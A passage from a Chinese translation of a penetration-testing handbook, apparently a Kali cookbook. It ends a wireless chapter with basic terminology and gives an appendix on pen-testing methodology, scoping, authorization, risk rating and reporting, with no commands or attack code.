无线攻击很难被发现；最好的方法就是采取预防和加固措施。SANS 已经制定了一个非常好的清单，讨论了无线网络的加固措施。可以在[`www.sans.org/score/checklists/wireless`](https://www.sans.org/score/checklists/wireless)找到。

还有其他工具可以提供无线攻击的上述功能。

对于理解 BSSID、ESSID 和监视模式有困难的读者，这里有一个解释：

+   **BSSID**：这是接入点的 Mac 地址；BSSID 代表基础服务站 ID。

+   **ESSID**：这是 WLAN 网络的名称，用户连接到 WLAN 网络时看到的可读名称。

+   **监视模式**：这允许无线网络接口监视无线网络上的所有流量，无论是从客户端到 AP，AP 到客户端，还是 AP 到客户端的广播。监视模式用于数据包分析，上面提到的大多数工具都使用它。

**AP**代表接入点。它也被视为用于连接客户端的无线设备；无线路由器就是一个接入点。攻击者可以创建一个虚假的接入点，并可以操纵用户连接到它。

**Beacon frame**是无线标准中的管理帧；它包含有关网络的信息，并定期传输以宣布 WLAN 网络的存在。

这就是无线测试章节的结束。


# 附录 A. 渗透测试 101 基础

在本章中，我们将涵盖以下主题：

+   介绍

+   什么是渗透测试

+   什么是漏洞评估

+   渗透测试与漏洞评估的区别

+   渗透测试的目标

+   渗透测试的类型：

+   黑盒

+   白盒

+   灰盒

+   谁应该进行渗透测试

+   这里的目标是什么

+   一般渗透测试阶段

+   收集要求

+   准备测试计划

+   渗透测试的不同阶段

+   提供测试客观性和边界

+   项目管理和第三方批准

+   漏洞的分类化

+   威胁管理

+   资产风险评级

+   报告

+   结论

# 介绍

对于任何组织来说，保护 IT 基础设施和客户数据至关重要；信息安全计划确保任何系统的可靠、不间断和安全运行。信息安全是一个广泛的领域，可以根据效率和专业知识划分为几个类别，如 Web 应用程序安全、移动应用程序安全和网络安全。

每个类别都有自己的背景要求，例如，开发人员可以成为优秀的 Web 应用程序测试人员，移动应用程序开发人员可以更好地掌握移动应用程序安全性，网络和系统管理员可以成为网络/系统/DevOps 安全工程师。并不一定需要有先前的知识，但需要对他们进行安全评估的领域有很好的了解。

在本章中，我们将学习渗透测试方法论。我们将列出在开始渗透测试之前应该注意的所有事项。您应该对诸如什么是渗透测试？它与漏洞评估有何不同？为什么我们作为一个组织要进行渗透测试？以及谁应该进行渗透测试-内部团队还是专门从事安全评估的外部供应商，都应该有清晰的答案。

# 什么是渗透测试？

渗透测试是从内部或外部对系统进行安全定向探测，几乎没有或没有系统本身的先验知识，以寻找攻击者可能利用的漏洞。当我们谈论渗透测试时，它不仅限于独立的机器；它可以是任何组合的 Web 或网络应用程序、主机或网络，以及云端或内部。换句话说，渗透测试是对 IT 基础设施的所有组件进行评估的活动，包括但不限于操作系统、网络通信协议、应用程序、网络设备、物联网连接设备、物理安全和人类心理，使用与攻击者完全相同的目标方法和方法，但由经过授权和经验丰富的安全专业人员在组织的董事会或经理批准的范围内执行。

维基百科提供的定义是：“渗透测试，非正式地称为 pen test，是对计算机系统的攻击，旨在寻找安全漏洞，可能获取对计算机的功能和数据的访问权限”。模拟内部渗透或外部渗透的变化，以及提供的目标信息量的不同，都有各自的好处，但实际上取决于什么能给您最大的保证，以及当时的需求是什么。

# 什么是漏洞评估

漏洞评估是将网络服务和版本与公开可用的漏洞进行映射的活动。它是非侵入性的，但基于主动收集的信息，并与不同版本的可用漏洞相关联。

漏洞评估可以在 Web 应用程序、网络协议、网络应用程序、网络设备和云端或本地服务器上执行。有时，雇主、组织或客户可能需要漏洞评估，因为他们担心进行渗透测试会破坏系统或丢失数据，或者两者都会发生。

值得注意的是，漏洞评估并不是实际的开发，而是匹配来自公共来源的相关数据，这些数据提到了网络/系统上给定服务版本的利用可能性。它包含误报。

# 渗透测试与漏洞评估

渗透测试和漏洞评估之间的一个主要区别在于实质上的开发部分。在漏洞评估中不进行开发，但开发是渗透测试的主要焦点和实际结果。

以下是其他值得注意的区别：

| **区别** | **漏洞评估** | **渗透测试** |
| --- | --- | --- |
| 自动化 | 可以完全自动化，达到令人满意和可靠的结果。 | 可以在一定程度上自动化，但需要熟练的个人来寻找所有可能的漏洞，并实际利用这些信息来从不同入口渗透系统。 |
| 时间 | 由于可以自动化，显然需要较少的时间，取决于检查的数量和正在检查的系统数量。但通常可以在单台机器上的几分钟内完成。 | 由于是手动的，需要人的效率和创造力来跳出思维定势并利用漏洞获得访问权限。可能需要数天才能完全获得对充分保护的系统的访问权限。 |
| 噪音水平 | 被动且产生较少日志 | 嘈杂且具有攻击性；产生大量日志并且可能非常混乱 |
| 误报 | 报告误报 | 消除误报 |
| 方法 | 程序化 | 直觉 |
| 测试性质 | 相同的测试/扫描 | 准确/彻底 |
| 开发 | 不适用 | 对系统具有完全访问权限 |

# 渗透测试的目标

渗透测试的目标非常简单明了；渗透测试为高管、架构师和产品经理提供了组织安全状况的全方位鸟瞰图。渗透测试还帮助决策者了解实际攻击的形式以及对业务、收入和声誉的影响。该过程涉及对潜在漏洞的严格分析，这些漏洞可能是由于网络、硬件、固件或软件缺陷的不良或不当配置而产生。它还有助于通过缩小安全风险范围和了解当前安全措施的有效性来专注于重要事项。还有其他主要原因：

+   **作为起点**：要解决问题，首先需要识别问题。这正是渗透测试所做的；它有助于识别问题及其所在位置。它帮助您了解可能发生侵犯的地方以及可能发生侵犯的确切原因，以便组织可以制定行动计划以在未来减轻这些安全问题。

+   **优先处理风险**：识别安全问题是渗透测试的主要目标。在了解存在安全问题后，它还有助于根据其影响和严重性对提出的安全问题进行优先处理。

+   **改善组织的整体安全性**：渗透测试不仅有助于识别技术安全问题，还有助于识别非技术问题，比如攻击可以多快被识别，一旦被识别可以采取什么行动，如何升级，升级给谁，以及在发生违规事件时该怎么办。它可以让人了解实际攻击的样子。它还有助于确定一个漏洞是技术漏洞还是非技术漏洞，比如用户点击网络钓鱼邮件直接给攻击者访问他们的笔记本电脑，打败了所有的网络安全设备和防火墙规则。这显示了员工安全信息培训的不足。

# 渗透测试类型

为了成功进行渗透测试活动，需要对整个流程进行规划。

也有不同类型的方法：

+   黑盒方法

+   白盒方法

+   灰盒方法

以下部分是测试阶段最常见的规范/方法。

## 黑盒

在黑盒方法中，测试人员对基础架构一无所知并进行测试。这就像在黑暗中射击，通常是真实攻击的方式；唯一的缺点是进行测试的时间限制，因为攻击者有很多时间来计划和准备他们的攻击；然而，测试人员没有，这将影响财务状况。黑盒方法通常如下进行：

+   枚举网络、应用程序、服务器等

+   对认证领域进行暴力破解

+   扫描网络以找到漏洞

+   在测试环境中测试利用

+   调整利用

+   执行利用

+   深入挖掘进入内部网络

+   清理

## 白盒

这种方法是一种非常广泛的方法，进行了广泛的测试，主要是因为在白盒中所有的凭据、源代码、网络架构、操作系统配置、数据库配置和防火墙规则都存在。这种审计需要很长时间，但也提供了公司脆弱性的精确信息，原因是整个工作范围都是 readily available，没有猜测的成分；一切都是显而易见的。步骤包括以下内容：

+   审查源代码

+   审查网络设备、操作系统和数据库的配置文件

+   使用域和服务器凭据扫描网络

+   识别漏洞

+   测试利用

+   执行利用

+   清理

## 灰盒

这是介于前面讨论的两种方法之间的方法。有部分详细信息可用于进行审计--例如，网络范围是什么，应用程序、服务器等的凭据是什么。此外，在灰盒活动中，防火墙规则被设置为允许流量，以了解进行渗透测试的原因。步骤包括以下内容：

+   使用提供的详细信息访问设备、应用程序和服务器

+   扫描和评估系统和应用程序

+   识别漏洞

+   利用漏洞

+   深入挖掘

+   执行利用

+   清理

# 谁应该进行渗透测试？

这是一个具有挑战性的问题；在这里要意识到的一件重要的事情是，任何具有安全知识，随时了解每天的漏洞情况，过去进行过渗透测试活动，熟悉漏洞，并且具有经验和良好认证的人更适合进行这样的活动。

在考虑这一点时，有两件事可以做：一是建立一个内部安全部门，定期进行渗透活动，并实时监视任何活动威胁，并在实时识别和减轻威胁，或者雇佣外部团队进行渗透测试活动，每年或每季度进行一次。通常，最好和成本效益最高的方式是拥有一个了解渗透测试并能够借助 CERT、Exploit-DB、NVD 等进行实时评估的内部测试团队。拥有一个安全团队总比没有任何安全措施要好；就像人们说的，预防总比不预防好。

当我们谈论外包时，我们需要了解这项活动将每年进行一次或每季度进行四次，这通常是一项非常昂贵的活动。人们需要仔细评估情况，并决定外部实体是否有效，还是内部团队是否有效；两者都有各自的优缺点。其中一个标准包括信任度和保持来进行渗透测试的人员发现的漏洞的保密性；人们永远不知道其他人的动机。此外，在外包活动时，必须付出很多思考，以确保信息不会泄露。当这项活动每年进行一次时，人们也无法清楚地了解其基础架构；它只能展示组织在那个时间点的样子。

网络和设备安全存在一些误解，每个人都需要明确：

+   没有什么是百分之百安全的

+   部署防火墙并不能使网络百分之百免受入侵尝试

+   IDS/IPS 并不能百分之百地防止攻击者

+   杀毒软件并不总是能够保护系统免受 0day 攻击

+   不上网也不能完全保护您免受攻击

+   每年进行测试也不能为另一年提供安全保障

# 这里的目标是什么？

目标是确保网络中的系统及其漏洞得到识别，并对其进行缓解，以便未来不会发生针对这些已知漏洞的攻击，并确保网络中的每个设备都得到识别，以及其开放的端口和缺陷。

# 一般渗透测试阶段

成功的渗透尝试分阶段进行，以了解或复制相同的需求，需要了解渗透测试的核心阶段。

该过程可以分解如下：

1.  收集需求

1.  准备和规划（阶段、目标、批准）

1.  评估/检测设备及其漏洞

1.  实际攻击

1.  漏洞的分类/报告

1.  威胁管理/资产风险评级

1.  报告

让我们简要了解这些过程。

## 收集需求

在这个阶段，我们尽可能多地收集关于我们目标的信息，比如识别 IP 地址和端口细节。一旦完成这一步，就可以收集有关其运行的操作系统版本和端口上运行的服务以及它们的版本的更多信息。此外，还可以对防火墙规则或对架构施加的网络限制进行绘制。

作为攻击者，我们会做以下事情：

+   确保检测到的所有 IP 地址在操作系统和设备类型方面都得到识别

+   识别开放的端口

+   识别在这些端口上运行的服务

+   如果可能的话，了解这些服务的版本细节

+   电子邮件 ID 泄露、邮件网关泄露等

+   绘制范围内整个局域网/广域网网络的地图

## 准备和规划

整个活动的一个非常关键的阶段是规划和准备；对此的微小偏差可能是灾难性的。为了理解这一点，需要了解渗透测试是一项消耗底层基础设施大量带宽的活动。没有组织希望在核心业务时间或业务高峰期使其网络陷入停滞。其他因素可能包括过多的流量导致网络拥塞和崩溃。在开始活动之前，还有许多其他关键因素需要解决。应该召集利益相关者进行启动会议，并明确确定测试的边界，即测试应该在哪些地方和哪些区域进行。一旦确定了这一点，就可以确定执行活动的有效时间，以确保网络不受影响，业务不受影响。还应考虑执行此活动所需的时间；有必要定义一个时间表，因为这会影响财务状况和测试人员的可用性。还应记录要测试和审计的设备的入围名单。

应在会议中讨论对各个入围设备进行渗透测试的时间。将关键服务器和非关键服务器进行分类，并决定它们进行测试的时间，以确保业务不受影响。组织应该决定是否要通知他们的团队正在进行渗透测试；这样做将确保业务不受影响，然而，检测到事件的主动性将超出范围。不通知团队正在进行渗透测试可能有其优点和缺点；其中一个是，如果网络团队检测到攻击，他们将按程序进行全面封锁网络，这可能导致业务损失，并减缓业务功能，导致部分混乱。

如果组织计划外包渗透测试活动，应签署协议规定，在测试范围内获取的所有信息和机密文件不得外泄，第三方将遵守保密协议，所有获取的信息和发现的漏洞都将保留在组织内部。

## 定义范围

一旦活动的所有准备和规划工作完成，渗透测试人员可以开始书中描述的整个活动。本书涵盖了从信息收集、漏洞评估、渗透测试、深入挖掘等整个过程的所有部分。一旦发现漏洞，就应制定渗透测试计划并付诸实施。

## 进行渗透测试

在这里，渗透测试人员必须决定要对哪些系统进行测试，比如，为了概括，假设有 n 个系统，其中 m 个系统是台式机。然后，测试应该集中在 n-m 个系统上，例如服务器。在这里，测试人员可以了解它们是什么类型的设备，然后可以开始利用。利用应该是一个计时活动，因为应用程序或设备崩溃的可能性可能会增加，如果利用失败，业务可能会受到影响。一旦确定了漏洞的数量，就应制定一个时间表，规定允许执行整个测试活动的时间。

可以使用各种工具，正如我们在本章中所见。Kali 提供了执行活动所需的所有工具的广泛资源。还可以与组织澄清社会工程是否是渗透测试的可接受方面；如果是，这些方法也可以包括在内并付诸执行。

## 漏洞分类

所有成功和失败的利用应该在这里进行映射，并且它们应该根据关键、高、中和低的评级进行分类。这个结论可以通过受影响设备的关键性和漏洞的 CVSS 评级或风险评级的协助来完成。风险是通过考虑许多因素来计算的：*风险 = 可能性 * 影响*。

## 资产风险评级

有各种因素需要考虑以下事项：

+   估计可能性的因素

+   估计风险的因素

以下是来自 OWASP 的图表，帮助理解估计可能性的因素：

![资产风险评级](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/Capture01.jpg)

为了了解漏洞影响的估计，我们参考以下图表：

![资产风险评级](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/Capture02.jpg)

## 报告

这是管理层查看的关键部分，对网络渗透测试所做的所有辛勤工作都体现在报告中。报告必须非常谨慎地完成，应该提供执行的所有活动的所有细节，并且报告应该涵盖并为所有层次理解：开发层、管理层和更高的管理层。

报告应包括所做的分析，并且漏洞需要根据风险评级显示。按照风险评级报告漏洞总是最佳实践，关键的漏洞在顶部，最低的在底部。这有助于管理层更好地了解漏洞，并且可以根据漏洞的风险评级采取行动。

报告的内容应包括以下内容：

+   覆盖报告整体要点的索引

+   需要关注的顶级漏洞列表

+   所有发现的摘要

+   范围，由组织定义

+   在审计阶段发现的任何限制或障碍

+   所有漏洞的详细列表

+   漏洞的描述及其证据

+   修复漏洞的建议

+   修复漏洞的替代方案

+   术语表

# 结论

这项活动可以得出成功的结论。然而，人们必须知道这并不是一个百分之百可靠的机制。这是因为渗透测试人员被给予有限的时间来执行活动，而攻击者没有时间表，随着时间的推移，他们可以制定一种方法来模拟攻击，收集多个漏洞。
